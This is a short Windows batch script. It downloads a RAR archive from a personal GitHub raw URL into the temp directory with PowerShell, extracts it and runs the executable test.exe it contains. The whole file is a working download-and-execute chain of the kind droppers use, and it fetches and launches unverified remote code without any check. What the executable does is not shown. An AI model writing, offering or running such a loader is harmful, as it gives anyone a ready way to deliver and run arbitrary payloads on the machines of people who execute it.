@echo off

REM Set the download and extraction directory to the Windows temporary directory
set downloadDir=%TEMP%

REM Open PowerShell and run the Invoke-WebRequest command
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/kovajoee/test/main/test.rar' -OutFile '%downloadDir%\test.rar'"

REM Change directory to the location of the downloaded rar file
cd "%downloadDir%"

REM Extract the rar file using tar.exe
tar -xf test.rar

REM Change directory to the extracted folder (assuming the extracted folder name is 'test')
cd "%downloadDir%\test"

REM Run test.exe
test.exe
